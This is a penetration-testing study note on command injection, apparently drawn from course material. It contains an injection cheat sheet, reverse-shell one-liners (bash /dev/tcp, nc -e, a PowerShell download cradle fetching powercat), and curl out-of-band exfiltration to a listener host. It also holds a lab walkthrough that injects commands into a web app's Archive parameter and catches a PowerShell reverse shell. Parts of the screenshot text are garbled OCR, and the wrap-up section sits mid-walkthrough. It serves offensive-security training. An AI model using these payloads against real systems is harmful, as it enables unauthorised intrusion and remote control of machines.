---
tags:
  - command-injection
  - phase/exploitation
  - rce
  - web
---

# Command Injection

> [!tip] Quick Reference — Command Injection
> | OS | Separator | Example |
> |----|-----------|---------|
> | Linux | `;` | `127.0.0.1; id` |
> | Linux | `&&` | `127.0.0.1 && id` |
> | Linux | `\|\|` | `127.0.0.1 \|\| id` |
> | Linux | `` ` `` | `` `id` `` |
> | Linux | `$()` | `$(id)` |
> | Windows | `&` | `127.0.0.1 & whoami` |
> | Windows | `\|` | `127.0.0.1 \| whoami` |
> | Both | `%0a` | URL-encoded newline |

## Decision Tree

```
Input reflected in a system command?
├── Identify OS
│   ├── Linux: cat /etc/passwd, id, uname -a
│   └── Windows: whoami, systeminfo, ipconfig
│
├── Try injection separators
│   ├── ; id          (Linux)
│   ├── & whoami      (Windows)
│   ├── | whoami      (both)
│   └── %0a id        (URL-encoded newline — bypasses some filters)
│
├── Execution confirmed → get reverse shell
│   ├── Linux bash
│   │   └── bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'
│   ├── Linux netcat
│   │   └── nc -e /bin/bash <LHOST> <LPORT>
│   └── Windows PowerShell
│       └── powershell -c "iex(iwr http://<LHOST>/powercat.ps1);powercat -c <LHOST> -p <LPORT> -e cmd"
│
├── Filter in place?
│   ├── Spaces blocked → use ${IFS} or tabs (%09)
│   ├── Words blocked → use env vars: ${PATH:0:1} = /
│   └── Burp Intruder with command injection wordlist
│
└── Blind injection? (no output)
    ├── Time-based: ; sleep 5
    ├── OOB: ; curl http://<LHOST>/?$(id)
    └── Write file: ; echo test > /var/www/html/test.txt
```

## Resources
- [HackTricks — Command Injection](https://book.hacktricks.xyz/pentesting-web/command-injection)
- [PayloadsAllTheThings — CMDi](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
- [revshells.com](https://www.revshells.com) — reverse shell generator


Web applications often need to interact with the underlying operating system, such as when a file is created through a file upload mechanism. Web applications should always offer specific APIs or functionalities that use prepared commands for the interaction with the system

> [!note]- Screenshot
> ```
> Figure 23 shows an updated version of the application. In this version, we're able to
> clone git repositories by entering the git clone command combined with a URL. The
> example shows us the same command we would use in the command line. We can
> hypothesize that maybe the operating system will execute this string and, therefore, we
> may be able to inject our own commands. Let's try to use the form to clone the
> ExploitDB repository.
> 
> Attention: Our desserts business didn't go so
> 
> well... We decided to switch to the tech area!
> 
> ‘sce wees ou 20k wend nebo eae Ay ess anymore. Anay We es
> 
> ‘new person ated a tras ea. we wl rove we torches and -
> 
> re 9c eas, We equa rye peo este ta! — iff Sa
> 
> Fo now we one asa demo, Use taco eposton and when we ach you
> 
> sien ali oN
> 
> ere fon coma ne eps Te
> 
> lone reposition, URL ee 2
> 
> nr
> 
> Figure 24: Clone command for the ExploitDB repository
> 
> After we click on submit the cloning process of the ExploitDB repository starts.
> i
> | 192168.50.189:8000/archive x +
> 
> € > SC © @ 192.168.50.189:8000/archive
> 
> Kali Linux @ KaliTools Kali Docs @ Kali Forums & Kali NetHunter % Exploit-DB_® Google Hacking DB. ‘| OftSec
> Repository successfully cloned with comand: git clone https://github.con/offensive-security/exploitdb and output:
> Figure 25: Successfully cloned the ExploitDB Repository via the Web Application
> 
> The output shows that the repository was successfully cloned.
> ```

Furthermore, the actual command is displayed in the web application's output. Let's try to inject arbitrary commands such as ipconfig, ifconfig, and hostname with curl. We'll switch over to HTTP history in Burp to understand the correct structure for the POST request. The request indicates the "Archive" parameter is used for the command.

> [!note]- Screenshot
> ```
> ew a=
> Figure 26: Archive Parameter in the POST request
> The figure shows that the "Archive" parameter contains the Git command. This means
> we can use curl to provide our own commands to the parameter. We'll do this by using
> the -X parameter to change the request type to POST. We'll also use --data to specify
> what data is sent in the POST request.
> kali@kali:~$
> Listing 40 - Detected Command Injection for ipconfig
> On our first try, the web application shows that it detected a command injection attempt
> with the ipconfig command. Let's attempt to backtrack from the working input and find
> a bypass for the filter. Next, we'll try to only provide the git command for the Archive
> parameter in the POST request.
> ```

curl -X POST --data 'Archive=ipconfig'
[http://192.168.50.189:8000/archive](http://192.168.50.189:8000/archive)

> [!note]- Screenshot
> ```
> kali@kali:~$ curl -X POST --data ‘Archive=git’ http: //192.168.50.189:8000/archive
> 
> ‘An error occurred with execution: exit status 1 and usage: git [--version] [--help] [-C
> 
> <path>] [-c <name>=<value>]
> 
> [--exec-path[=<path>]] [--html-path] [--man-path] [--info-path]
> [-p | --paginate | -P | --no-pager] [--no-replace-objects] [--bare]
> push Update remote refs along with associated objects
> 
> ‘git help -a’ and ‘git help -g’ list available subcommands and some
> 
> concept guides. See “git help <command>’ or ‘git help <concept>*
> 
> to read about a specific subcommand or concept.
> 
> See “git help git’ for an overview of the system.
> 
> Listing 41 - Entering git as command
> 
> The output shows the help page for the git command, confirming that we are not
> restricted to only using git clone. Since we know that only providing "git" works for
> execution, we can try to add the version subcommand. If this is executed, we'll
> establish that we can specify any git command and achieve code execution. This will
> also reveal if the web application is running on Windows or Linux, since the output of git
> version includes the "Windows" string in Git for Windows. If the web application is
> running on Linux, it will only show the version for Git.
> 
> kali@kali:~§ curl -x POST --data ‘Archive=git version’ http://192.168.50.189:8000/archi
> 
> ve
> 
> Repository successfully cloned with command: git version and output: git version 2.35.
> 
> 1.windows.2
> 
> Listing 42 - Using git version to detect the operating system
> ```


```sh
curl -X POST --data 'Archive=git version' http://192.168.50.189:8000/archive
```


> [!note]- Screenshot
> ```
> The output shows that the web application is running on Windows. Now we can use
> trial-and-error to poke around the filter and review what's allowed. Since we established
> that we cannot simply specify another command, let's try to combine the git and
> ipconfig commands with a URL-encoded semicolon represented as "%3B". Semicolons
> can be used in a majority of command lines, such as PowerShell or Bash as a delimiter
> for multiple commands. Alternatively, we can use two ampersands, "&&", to specify two
> consecutive commands. For the Windows command line (CMD), we can also use one
> ampersand.
> kali@kali:~$ curl -X POST --data ‘Archive=git%3Bipconfig’ http://192.168.50.189:8000/ar
> chive
> ‘git help -a’ and ‘git help -g’ list available subcommands and some
> concept guides. See “git help <command>’ or ‘git help <concept>*
> to read about a specific subcommand or concept.
> See “git help git’ for an overview of the system.
> Windows IP Configuration
> Ethernet adapter Ethernet@ 2:
> Connection-specific DNS Suffix . :
> Ipva Address... .. . . . « « « : 192.168.50.189
> Subnet Mask»... 1. e « « « : 255.255.255.0
> Default Gateway... . . « . : 192.168.50.254
> Listing 43 = Entering git and ipconfig with encoded semicolon =
> ```


```sh
curl -X POST --data 'Archive=git%3Bipconfig' http://192.168.50.189:8000/archive
```

The output shows that both commands were executed. We can assume that there is a filter in place checking if "git" is executed or perhaps contained in the "Archive" parameter. Next, let's find out more about how our injected commands are executed. We will first determine if our commands are executed by PowerShell or CMD. In a situation like this, we can use a handy snippet, published by PetSerAl that displays "CMD" or "PowerShell" depending on where it is executed.

> [!note]- Screenshot
> ```
> | (dir 2>81 **|echo CMD) ;&<# rem #>echo PowerShell
> Listing 44 - Code Snippet to check where our code is executed
> ```


```sh
(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
```


> [!note]- Screenshot
> ```
> We'll use URL encoding once again to send it.
> 
> kali@kali:~$ curl -X POST --data ‘Archive=git%3B(dir%202%3E%261%20*%60%7Cecho%20CMD)%3.
> 
> B%26%3C%23%20rem%20%23%3Eecho%2@Powershell’ http: //192.168.50.189: 8000/archive
> 
> See “git help git’ for an overview of the system.
> 
> PowerShell
> 
> Listing 45 - Determining where the injected commands are executed
> 
> The output contains "PowerShell", meaning that our injected commands are executed in
> a PowerShell environment.
> ```


```sh
curl -X POST --data 'Archive=git%3B(dir%202%3E%261%20*%60%7Cecho%20CMD)%3B%26%3C%23%20rem%20%23%3Eecho%20PowerShell' http://192.168.50.189:8000/archive
```

The output contains "PowerShell", meaning that our injected commands are executed in a PowerShell environment.

Next, let's try to leverage command injection to achieve system access. We will use Powercat to create a reverse shell. Powercat is a PowerShell implementation of Netcat included in Kali. Let's start a new terminal, copy Powercat to the home directory for the kali user, and start a Python3 web server in the same directory.
[https://github.com/besimorhino/powercat](https://github.com/besimorhino/powercat)
With our web server serving powercat.ps1 and Netcat listener in place, we can now use curl in the first terminal to inject the following command. It consists of two parts delimited by a semicolon. The first part uses a PowerShell download cradle to load the Powercat function contained in the powercat.ps1 script from our web server. The second command uses the powercat function to create the reverse shell with the following parameters: -c to specify where to connect, -p for the port, and -e for executing a program.










9.5. Wrapping up
In this Module, we covered a variety of different common web application attacks. First, we explored how to display the contents of files outside of the web root with directory traversal attacks. Next, we used file inclusion to not only display the contents of files, but to also execute files by including them within the web application's running code. We then abused file upload vulnerabilities with executable and non-executable files. Finally, we learned how to leverage command injection to get access to a web application's underlying system.

Understanding these kinds of attacks will prove extremely helpful in any kind of security assessment. When we exploit them in publicly accessible web applications over the internet, they may lead us to an initial foothold in the target's network. Alternatively, when we find vulnerabilities for these attacks in internal web services, they may provide us with lateral movement vectors. While the vulnerabilities are not dependent on specific programming languages or web frameworks, their exploitation may be. Therefore, we should always take the time to briefly understand the web technologies being used before we attempt to exploit them. With the skills covered in this Learning Unit, we can identify and exploit a broad variety of web applications.

> [!note]- Screenshot
> ```
> kali@kali:~$ cp /usr/share/powershell-empire/empire/server/data/module_source/managemen
> 
> t/powercat.psi .
> 
> kali@kali:~§ python3 -m http.server 80
> 
> Serving HTTP on 0.0.8.0 port 8@ (http://@.0.0.0:80/) ...
> 
> Listing 46 - Serve Powercat via Python3 web server
> 
> Next, we'll start a third terminal tab to create a Netcat listener on port 4444 to catch the
> reverse shell.
> 
> kali@kali:~$ nc -nvlp 4444
> 
> listening on [any] 4444 ...
> 
> Listing 47 - Starting Netcat listener on port 4444
> ```


```sh
cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .
python3 -m http.server 80
nc -nvlp 4444
```


> [!note]- Screenshot
> ```
> With our web server serving powercat.ps1 and Netcat listener in place, we can now use
> curl in the first terminal to inject the following command. It consists of two parts
> delimited by a semicolon. The first part uses a PowerShell download cradle to load the
> Powercat function contained in the powercat.ps1 script from our web server. The
> second command uses the powercat function to create the reverse shell with the
> following parameters: -c to specify where to connect, -p for the port, and -e for
> executing a program.
> 
> TEX (New-Object System.Net .Webclient) .Downloadstring( "http: //192.168.119.3/powercat.ps
> 
> 1");powercat -c 192.168.119.3 -p 4444 -e powershell
> 
> Listing 48 - Command to download PowerCat and execute a reverse shell
> 
> Again, we'll use URL encoding for the command and send it.
> 
> kali@kali:~$ curl -X POST --data ‘Aarchive=git%3BIEX%20(New-Object%20system.Net.Webclien
> 
> ‘t) Downloadstring (%22htt p%3AX2F%2F192. 168.119. 3%2Fpowercat . ps1%22) %3Bpowercat&20-c%2019
> 
> 2.168.119. 3%20-p%204444%20-e%20powershell" http: //192.168.50.189:8000/archive
> 
> Listing 49 - Downloading Powercat and creating a reverse shell via Command Injection
> ```


```sh
IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.119.3/powercat.ps1");powercat -c 192.168.119.3 -p 4444 -e powershell
```


```sh
curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2F192.168.119.3%2Fpowercat.ps1%22)%3Bpowercat%20-c%20192.168.119.3%20-p%204444%20-e%20powershell' http://192.168.50.189:8000/archive
```


> [!note]- Screenshot
> ```
> After entering the command, the second terminal should show that we received a GET
> request for the powercat.pst file.
> 
> kali@kali:~$ python3 -m http.server 30
> 
> Serving HTTP on @.0.0.@ port 8@ (http://0.0.0.0:80/) ...
> 
> 192.168.50.189 - - [05/Apr/2022 09:05:48] “GET /powercat.ps1 HITP/1.1" 200 -
> 
> Listing 50 - Python3 web server shows GET request for powercat.ps1
> 
> We'll also find an incoming reverse shell connection in the third terminal for our active
> Netcat listener.
> 
> kali@kali:~§ nc -nvip 4444
> 
> listening on [any] 4444 ...
> 
> connect to [192.168.119.3] from (UNKNOWN) [192.168.50.189] 50325
> 
> Windows Powershell
> 
> Copyright (C) Microsoft Corporation. All rights reserved.
> 
> PS C:\Users\Administrator\Documents\meteor>
> Listing 51 - Successful reverse shell connection via Command injection =
> Listing 51 shows that we received a reverse shell. Instead of using Powercat, we could
> also inject a PowerShell reverse shell directly. There are many ways to exploit a
> command injection vulnerability that depend heavily on the underlying operating system
> and the implementation of the web application, as well as any security mechanisms in
> place.
> ```

---
%% graph-links %%
## Related
- [[Local file inclusion (LFI)]]
- [[PHP wrappers]]
- [[Using executable files]]
- [[Enumerating and Abusing APIs]]

> [!info] Navigation
> Section: [[Web Applications/Common Web Application Attacks/_index|Common Web Application Attacks]] · Home: [[🏠 Home]]

